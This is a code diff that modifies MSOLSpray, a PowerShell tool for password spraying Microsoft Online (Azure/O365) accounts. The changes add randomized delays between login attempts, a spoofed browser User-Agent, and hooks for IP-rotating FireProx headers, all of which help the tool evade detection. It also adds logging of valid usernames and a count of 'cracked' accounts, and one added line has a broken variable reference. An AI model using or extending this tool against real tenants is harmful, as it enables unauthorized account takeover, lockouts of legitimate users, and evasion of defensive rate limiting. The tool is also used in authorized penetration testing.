@@ -6,6 +6,7 @@ function Invoke-MSOLSpray{
         This module will perform password spraying against Microsoft Online accounts (Azure/O365). The script logs if a user cred is valid, if MFA is enabled on the account, if a tenant doesn't exist, if a user doesn't exist, if the account is locked, or if the account is disabled.       
         MSOLSpray Function: Invoke-MSOLSpray
         Author: Beau Bullock (@dafthack)
+        Mod'r:Ceramicskate0
         License: BSD 3-Clause
         Required Dependencies: None
         Optional Dependencies: None
@@ -22,6 +23,10 @@ function Invoke-MSOLSpray{
         
         A single password that will be used to perform the password spray.
     
+    .PARAMETER Delay
+    A number in seconds to delay between requests.
+		
+		
     .PARAMETER OutFile
         
         A file to output valid results to.
@@ -49,8 +54,6 @@ function Invoke-MSOLSpray{
         This command uses the specified FireProx URL to spray from randomized IP addresses and writes the output to a file. See this for FireProx setup: https://github.com/ustayready/fireprox.
 #>
   Param(
-
-
     [Parameter(Position = 0, Mandatory = $False)]
     [string]
     $OutFile = "",
@@ -62,17 +65,25 @@ function Invoke-MSOLSpray{
     [Parameter(Position = 2, Mandatory = $False)]
     [string]
     $Password = "",
-
-    # Change the URL if you are using something like FireProx
+	
     [Parameter(Position = 3, Mandatory = $False)]
+    [Int]
+    $Delay = 10,
+	
+    [Parameter(Position = 4, Mandatory = $False)]
+    [string]
+    $UserAgent  = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36 Edge/12.0",
+	
+    # Change the URL if you are using something like FireProx
+    [Parameter(Position = 5, Mandatory = $False)]
     [string]
     $URL = "https://login.microsoft.com",
 
-    [Parameter(Position = 4, Mandatory = $False)]
+    [Parameter(Position = 6, Mandatory = $False)]
     [switch]
     $Force
   )
-    
+
     $ErrorActionPreference= 'silentlycontinue'
     $Usernames = Get-Content $UserList
     $count = $Usernames.count
@@ -95,14 +106,20 @@ function Invoke-MSOLSpray{
 
         # Setting up the web request
         $BodyParams = @{'resource' = 'https://graph.windows.net'; 'client_id' = '1b730954-1685-4b74-9bfd-dac224a7b894' ; 'client_info' = '1' ; 'grant_type' = 'password' ; 'username' = $username ; 'password' = $password ; 'scope' = 'openid'}
-        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}
-        $webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -ErrorVariable RespErr 
+        #Add Special Headers for Firprox Here. ';' is seperation char. Example: 'X-My-X-HEADER' = 'VALUE'
+        $PostHeaders = @{'Accept' = 'application/json'; 'Content-Type' =  'application/x-www-form-urlencoded'}#;'X-My-X-Forwarded-For' = '127.0.0.1'}
+        if ($Delay) {
+            $SleepTime = Get-Random -Minimum 0 -Maximum $Delay
+            Start-Sleep -Seconds $SleepTime
+        }
 
-        # If we get a 200 response code it's a valid cred
+	$webrequest = Invoke-WebRequest $URL/common/oauth2/token -Method Post -Headers $PostHeaders -Body $BodyParams -UserAgent $UserAgent -ErrorVariable RespErr 
+
+ 	# If we get a 200 response code it's a valid cred
         If ($webrequest.StatusCode -eq "200"){
-        Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password"
+            Write-Host -ForegroundColor "green" "[+] $username : $password"
             $webrequest = ""
-            $fullresults += "$username : $password"
+            $fullresults += "[+] $username : $password"
         }
         else{
                 # Check the response for indication of MFA, tenant, valid user, etc...
@@ -112,59 +129,58 @@ function Invoke-MSOLSpray{
                 # Standard invalid password
             If($RespErr -match "AADSTS50126")
                 {
-                continue
+		Write-Host -ForegroundColor "white" "[*] Valid user, but invalid password $username : $password"
+                $fullresults += "Valid user, but invalid password : $username"
+				#continue
                 }
-
                 # Invalid Tenant Response
             ElseIf (($RespErr -match "AADSTS50128") -or ($RespErr -match "AADSTS50059"))
                 {
-                Write-Output "[*] WARNING! Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
+                Write-Host -ForegroundColor "yellow" "[-] Tenant for account $username doesn't exist. Check the domain to make sure they are using Azure/O365 services."
                 }
-
                 # Invalid Username
             ElseIf($RespErr -match "AADSTS50034")
                 {
-                Write-Output "[*] WARNING! The user $username doesn't exist."
+                 Write-Host -ForegroundColor "yellow" "[-] $username doesn't exist. Invalid Username."
                 }
-
                 # Microsoft MFA response
             ElseIf(($RespErr -match "AADSTS50079") -or ($RespErr -match "AADSTS50076"))
                 {
-                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
+                Write-Host -ForegroundColor "green" "[+] $username : $password - NOTE: The response indicates MFA (Microsoft) is in use."
                 $fullresults += "$username : $password"
                 }
-    
                 # Conditional Access response (Based off of limited testing this seems to be the repsonse to DUO MFA)
             ElseIf($RespErr -match "AADSTS50158")
                 {
-                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
+                Write-Host -ForegroundColor "green" "[+] $username : $password - NOTE: The response indicates conditional access (MFA: DUO or other) is in use."
                 $fullresults += "$username : $password"
                 }
-
                 # Locked out account or Smart Lockout in place
             ElseIf($RespErr -match "AADSTS50053")
                 {
-                Write-Output "[*] WARNING! The account $username appears to be locked."
+                Write-Host -ForegroundColor "red" "[-] The account $username appears to be locked."
                 $lockout_count++
                 }
-
                 # Disabled account
             ElseIf($RespErr -match "AADSTS50057")
                 {
-                Write-Output "[*] WARNING! The account $username appears to be disabled."
+                Write-Host -ForegroundColor "yellow" "[-] The account $username appears to be disabled."
                 }
-            
                 # User password is expired
             ElseIf($RespErr -match "AADSTS50055")
                 {
-                Write-Host -ForegroundColor "green" "[*] SUCCESS! $username : $password - NOTE: The user's password is expired."
+                Write-Host -ForegroundColor "green" "[+] $username : $password - NOTE: The user's password is expired."
                 $fullresults += "$username : $password"
                 }
-
+			ElseIf(($RespErr -match "AADSTS53003") -or ($RespErr -match "AADSTS53000"))
+                {
+                Write-Host -ForegroundColor "green" "[+]  $username : $password - NOTE: The response indicates a conditional access policy is in place and the policy blocks token issuance."
+                $fullresults += "$username : $password"
+                }
                 # Unknown errors
             Else
                 {
-                Write-Output "[*] Got an error we haven't seen yet for user $username"
+                Write-Host -ForegroundColor "red" "[!] Got an error we haven't seen yet for user $username = $RespErr"
                 $RespErr
                 }
         }
@@ -172,8 +188,8 @@ function Invoke-MSOLSpray{
         # If the force flag isn't set and lockout count is 10 we'll ask if the user is sure they want to keep spraying
         if (!$Force -and $lockout_count -eq 10 -and $lockoutquestion -eq 0)
         {
-            $title = "WARNING! Multiple Account Lockouts Detected!"
-            $message = "10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
+            $title = "[!] WARNING! Multiple Account Lockouts Detected!"
+            $message = "[!] 10 of the accounts you sprayed appear to be locked out. Do you want to continue this spray?"
 
             $yes = New-Object System.Management.Automation.Host.ChoiceDescription "&Yes", `
                 "Continues the password spray."
@@ -187,12 +203,13 @@ function Invoke-MSOLSpray{
             $lockoutquestion++
             if ($result -ne 0)
             {
-                Write-Host "[*] Cancelling the password spray."
-                Write-Host "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
+                Write-Host -ForegroundColor "red" "[!] Cancelling the password spray."
+                Write-Host -ForegroundColor "yellow" "NOTE: If you are seeing multiple 'account is locked' messages after your first 10 attempts or so this may indicate Azure AD Smart Lockout is enabled."
                 break
             }
         }
-        
+        $Matches = Select-String -InputObject $fullresults -Pattern "[+]" -AllMatches
+	Write-Host "green" "Number of Cracked accounts: $(Matches.Matches.Count) "    
     }
 
     # Output to file
